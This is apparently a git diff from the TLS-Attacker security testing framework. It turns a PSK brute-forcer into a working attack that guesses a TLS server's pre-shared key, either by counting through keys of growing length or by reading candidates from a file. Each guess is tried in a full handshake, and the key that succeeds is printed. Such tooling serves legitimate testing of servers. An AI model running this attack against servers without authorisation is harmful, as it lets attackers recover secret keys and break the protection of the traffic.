@@ -14,7 +14,7 @@ import de.rub.nds.modifiablevariable.biginteger.ModifiableBigInteger;
 import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
-import de.rub.nds.tlsattacker.attacks.config.PskBruteForcerCommandConfig;
+import de.rub.nds.tlsattacker.attacks.config.PskBruteForcerAttackServerCommandConfig;
 import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
 import de.rub.nds.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
 import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
@@ -49,6 +49,8 @@ import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
 import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
 import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
 import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
+import de.rub.nds.tlsattacker.attacks.ec.ICEPoint;
+import de.rub.nds.tlsattacker.attacks.ec.ICEPointReader;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.CipherSuite;
 import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
@@ -75,27 +77,25 @@ import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import de.rub.nds.tlsattacker.core.state.TlsContext;
+import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.action.TLSAction;
 import de.rub.nds.tlsattacker.transport.udp.timing.TimingClientUdpTransportHandler;
 import java.nio.charset.Charset;
 import org.bouncycastle.util.BigIntegers;
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import de.rub.nds.tlsattacker.transport.ConnectionEnd;
 
 /**
  *
  * @author florian
  */
-public class PskBruteForcer extends Attacker<PskBruteForcerCommandConfig> {
-    private static final Logger LOGGER = LogManager.getLogger(PskBruteForcer.class);
+public class PskBruteForcerAttackServer extends Attacker<PskBruteForcerAttackServerCommandConfig> {
+    private static final Logger LOGGER = LogManager.getLogger(PskBruteForcerAttackServer.class);
 
-    // private TlsContext context;
-    // private RecordLayer recordLayer;
-    // private List<TLSAction> actionList;
-    // private TimingClientUdpTransportHandler transportHandler;
-    // private WorkflowExecutor workflowExecutor;
-    // private WorkflowTrace trace;
-    // private final Config tlsConfig;
-
-    public PskBruteForcer(PskBruteForcerCommandConfig config) {
+    public PskBruteForcerAttackServer(PskBruteForcerAttackServerCommandConfig config) {
         super(config, false);
         // tlsConfig = config.createConfig();
 
@@ -103,7 +103,43 @@ public class PskBruteForcer extends Attacker<PskBruteForcerCommandConfig> {
 
     @Override
     public void executeAttack() {
-        WorkflowTrace trace = executeProtocolFlow();
+        if (config.getUsePskTable()) {
+            executeAttackWithPskTable();
+        } else {
+            executeAttackWithoutPskTable();
+        }
+    }
+
+    public void executeAttackWithoutPskTable() {
+        boolean result = false;
+        int counter = 0;
+        int size = 0;
+        while (!result) {
+            if (counter % 256 == 0) {
+                size++;
+            }
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT,
+                    ArrayConverter.bytesToHexString(ArrayConverter.intToBytes(counter, size)));
+            result = executeProtocolFlowToServer(ArrayConverter.intToBytes(counter, size));
+            counter++;
+        }
+    }
+
+    public void executeAttackWithPskTable() {
+        String fileName = "psk_database.txt";
+        boolean result = false;
+        BufferedReader br = new BufferedReader(new InputStreamReader(PskBruteForcerAttackServer.class.getClassLoader()
+                .getResourceAsStream(fileName)));
+        String line;
+        try {
+            while ((line = br.readLine()) != null && !result) {
+                if (line.length() != 0) {
+                    result = executeProtocolFlowToServer(ArrayConverter.hexStringToByteArray(line));
+                }
+            }
+        } catch (IOException | NumberFormatException ex) {
+            throw new ConfigurationException(ex.getLocalizedMessage(), ex);
+        }
     }
 
     @Override
@@ -116,19 +152,11 @@ public class PskBruteForcer extends Attacker<PskBruteForcerCommandConfig> {
         messageList.add(new ServerHelloMessage(tlsConfig));
         messageList.add(new ServerHelloDoneMessage(tlsConfig));
         trace.addTlsAction(new ReceiveAction(messageList));
-        // messageList = new LinkedList<>();
-        // context.setPSKIdentity(ArrayConverter.hexStringToByteArray("436c69656e745f6964656e74697479"));
-        // messageList.add(new PskClientKeyExchangeMessage());
-        // messageList.add(new ChangeCipherSpecMessage());
-        // trace.addTlsAction(new SendAction(messageList));
-        // messageList = new LinkedList<>();
-        // trace.addTlsAction(new ReceiveAction(messageList));
         tlsConfig.setWorkflowTrace(trace);
         State state = new State(tlsConfig, trace);
         WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                 tlsConfig.getWorkflowExecutorType(), state);
         workflowExecutor.executeWorkflow();
-
         if (state.getTlsContext().getSelectedCipherSuite() == CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA) {
             LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable (probably), Server uses PSK");
             return true;
@@ -136,18 +164,24 @@ public class PskBruteForcer extends Attacker<PskBruteForcerCommandConfig> {
             LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Not Vulnerable (probably), Server not uses PSK");
             return false;
         }
-
-        // context.setPSKIdentity();
     }
 
-    private WorkflowTrace executeProtocolFlow() {
+    private boolean executeProtocolFlowToServer(byte[] pskTry) {
         Config tlsConfig = config.createConfig();
-        tlsConfig.setDefaultPSKKey(ArrayConverter.hexStringToByteArray("1a2b3c4d"));
+        tlsConfig.setDefaultPSKKey(pskTry);
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHelloWorkflow();
+        State state = new State(tlsConfig, trace);
+        state.setWorkflowTrace(trace);
+        state.getTlsContext().setClientSupportedCiphersuites(CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA);
+        tlsConfig.setDefaultSelectedCipherSuite(CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA);
+        trace.removeTlsAction(1);
+        trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig), new ServerHelloDoneMessage(tlsConfig)));
+
         trace.addTlsAction(new SendAction(new PskClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
                 tlsConfig), new FinishedMessage(tlsConfig)));
+
         trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
-        State state = new State(tlsConfig, trace);
+
         WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                 tlsConfig.getWorkflowExecutorType(), state);
         PskClientKeyExchangeMessage message = (PskClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
@@ -156,6 +190,22 @@ public class PskBruteForcer extends Attacker<PskBruteForcerCommandConfig> {
         message.prepareComputations();
         message.setIdentity("Client_Identity".getBytes(Charset.forName("UTF-8")));
         workflowExecutor.executeWorkflow();
-        return trace;
+        // boolean result = trace.executedAsPlanned();
+        // String workflowString = state.getWorkflowTrace().toString();
+        // if (!result) {
+        // LOGGER.info(workflowString);
+        // }
+        // if (trace.getLastAction() == new ReceiveAction(new
+        // FinishedMessage(tlsConfig))) {
+        // LOGGER.log(LogLevel.CONSOLE_OUTPUT, "PSK " + "1a2b3c4d");
+        // }
+
+        if (trace.executedAsPlanned()) {
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "PSK " + ArrayConverter.bytesToHexString(pskTry));
+            return true;
+        } else {
+            // LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Wrong PSK");
+            return false;
+        }
     }
 }
